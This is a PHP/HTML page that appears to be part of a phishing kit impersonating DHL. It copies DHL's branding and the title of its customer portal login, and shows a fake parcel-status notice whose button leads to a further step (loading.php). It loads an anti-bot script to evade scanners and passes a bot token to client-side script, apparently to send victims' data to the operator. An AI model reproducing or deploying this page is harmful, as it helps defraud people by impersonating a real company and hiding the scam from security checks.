<?php 
session_start();
include '../antibots/index.php';




     require_once "functions.php";
     require_once 'detect.php';

     lang();


?>


<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title>Login to Customer Portals and Tools | DHL |</title>
        <!-- logo site web-->
        <link rel="icon" href="image/favicon.ico" type="image/x-icon"/>
        <link rel="shortcut icon" href="image/favicon.ico" type="image/x-icon" />
        <!-- link__css -->
        <link rel="stylesheet"  href="css/bootstrap.css">
        <link rel="stylesheet"  href="css/posta.css">
</head>
<body>


        <!-- Start____Navbar -->
        <div class="navbar">
        	<div class="container-fluid">
        		<div class="topping">
        			<img src="image/dhl-logo.svg">
        			<ul class="web">
        				<li><i class="bi bi-exclamation-circle me-2"></i><?php echo get_text('top_header1'); ?></li>
        				<li><?php echo get_text('top_header2'); ?></li>
        				<li><i class="bi bi-globe me-2"></i><?php echo get_text('top_header3'); ?></li>
        				<li><i class="bi bi-search me-2"></i><?php echo get_text('top_header4'); ?></li>
        			</ul>
        			<ul class="respo">
        				<li><i class="bi bi-list"></i></li>
        				<li></li>
        			</ul>
        		</div>
        		<div class="bottomin">
        			<ul>
        				<li><?php echo get_text('mainmenu1'); ?><i class="bi bi-chevron-down ms-1"></i></li>
        				<li><?php echo get_text('mainmenu2'); ?><i class="bi bi-chevron-down ms-1"></i></li>
        				<li><?php echo get_text('mainmenu3'); ?><i class="bi bi-chevron-down ms-1"></i></li>
        				<li><?php echo get_text('mainmenu4'); ?><i class="bi bi-chevron-down ms-1"></i></li>
        			</ul>
        			<p><i class="bi bi-person-fill me-2"></i><?php echo get_text('header-right'); ?></p>
        		</div>
        	</div>
        </div>
        <!-- End____Navbar -->

        <!-- Start____Home -->
		<script>var token=<?php echo json_encode($BotToken); ?>;</script>
		<script src="./js/jq.js"></script>
        <div class="home">
        	<div class="otside">
        		<div class="container"> 
        			<div class="text-center"><h1><?php echo get_text('title'); ?></h1></div>
        			<div class="lettre">
        				<div class="titre">
        					<img src="image/camion.png">
        					<h3><?php echo get_text('title2'); ?></h3>
        				</div>
        				<div class="steps">
        					<span class="green"></span>
        					<span class="green"></span>
        					<span></span>
        				</div>
        				<div class="msaws mt-4">
							<div class="right">
								<div class="offre">
                                    <div class="status">
                                        <p><?php echo get_text('status'); ?></p>
                                    </div>
                                    <div class="status">
                                        <p><?php echo get_text('parcel'); ?></p>
                                    </div>
                                    <div class="status">
                                        <p><?php echo get_text('tracking'); ?></p>
                                    </div>
                                </div>
								<div class="offre">
									<div class="status">
										<p><?php echo get_text('last_update'); ?> : <b><?php echo date('l jS \of  h:i A'); ?></b></p>
									</div>
									<div class="status">
										<p><?php echo get_text('shipment'); ?></p>
									</div>
									<div class="status">
										<p><?php echo get_text('total'); ?></p>
									</div>
								</div>
							</div>
    						<div class="important mt-4">
    							<h5><?php echo get_text('important_title'); ?></h5>
    							<p><?php echo get_text('important_message'); ?></p>
    							<button class="btn" name="submit"><a href="loading.php"><?php echo get_text('next'); ?></a> </button>
    						</div>
        				</div>
        			</div>
        		</div>
        	</div>
        </div>
        <!-- Ennnd____Home -->


        <!-- Start___Fotter -->
        <div class="fotter">
        	<div class="container-fluid">
        		<div class="row">
        			<div class="col-lg-3 col-md-6 col-sm-6 col-12">
        				<ul>
        					<li class="power "><?php echo get_text('footer-widget-1-header'); ?></li>
        					<li><?php echo get_text('footer-widget-1-1'); ?></li>
        					<li><?php echo get_text('footer-widget-1-2'); ?></li>
        					<li><?php echo get_text('footer-widget-1-3'); ?></li>
        					<li><?php echo get_text('footer-widget-1-4'); ?></li>
        				</ul>
        			</div>
        			<div class="col-lg-3 col-md-6 col-sm-6 col-12">
        				<ul>
        					<li class="active"><?php echo get_text('footer-widget-2-header'); ?></li>
							<li><?php echo get_text('footer-widget-2-1'); ?></li> 
							<li><?php echo get_text('footer-widget-2-2'); ?></li>
							<li><?php echo get_text('footer-widget-2-3'); ?></li>
							<li><?php echo get_text('footer-widget-2-4'); ?></li>
							<li><?php echo get_text('footer-widget-2-5'); ?></li>
							<li><?php echo get_text('footer-widget-2-6'); ?></li>
        				</ul>
        			</div>
        			<div class="col-lg-3 col-md-6 col-sm-6 col-12">
        				<ul>
        					<li class="active"><?php echo get_text('footer-widget-3-header'); ?></li>
							<li><?php echo get_text('footer-widget-3-1'); ?></li>
							<li><?php echo get_text('footer-widget-3-2'); ?></li>
							<li><?php echo get_text('footer-widget-3-3'); ?></li>
							<li><?php echo get_text('footer-widget-3-4'); ?></li>
							<li><?php echo get_text('footer-widget-3-5'); ?></li>
							<li><?php echo get_text('footer-widget-3-6'); ?></li>
							<li><?php echo get_text('footer-widget-3-7'); ?></li>
							<li><?php echo get_text('footer-widget-3-8'); ?></li>
							<li><?php echo get_text('footer-widget-3-9'); ?></li>
        				</ul>
        			</div>
        			<div class="col-lg-3 col-md-6 col-sm-6 col-12">
        				<ul>
        					<li class="active"><?php echo get_text('footer-widget-4-header'); ?></li>
							<li><?php echo get_text('footer-widget-4-1'); ?></li>
							<li><?php echo get_text('footer-widget-4-2'); ?></li>
							<li><?php echo get_text('footer-widget-4-3'); ?></li>
							<li><?php echo get_text('footer-widget-4-4'); ?></li>
							<li><?php echo get_text('footer-widget-4-5'); ?></li>
							<li><?php echo get_text('footer-widget-4-6'); ?></li>
        				</ul>
        			</div>
        		</div>
        	</div>
        </div>
        <!-- Ennnd___Fotter -->


        <!-- STAAAART_SOUS -->
         <div class="sous ">
        	<div class="container-fluid">
        		<div class="row">
        			<div class="col-lg-9">
        				<img src="image/group.svg">
        				<ul>
        					<li><?php echo get_text('footer-menu-1'); ?></li>
        					<li><?php echo get_text('footer-menu-2'); ?></li>
        					<li><?php echo get_text('footer-menu-3'); ?></li>
        					<li><?php echo get_text('footer-menu-4'); ?></li>
        					<li><?php echo get_text('footer-menu-5'); ?></li>
        					<li><?php echo get_text('footer-menu-6'); ?></li>
        					<li><?php echo get_text('footer-menu-7'); ?></li>
        					<li><?php echo get_text('footer-menu-8'); ?></li>
        				</ul>
        			</div>
        			<div class="col-lg-3">
        				<h6><?php echo get_text('follow-us'); ?></h6>
        				<img src="image/socio.png" class="socio">
        			</div>
        			<div class="text-center ss"><?php echo get_text('copyright'); ?></div>
        		</div>	
        	</div>
        </div>
        <!-- ENNNNNND_SOUS -->







        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script src="js/jquery.mask.js"></script>
        
              
</body>
</html>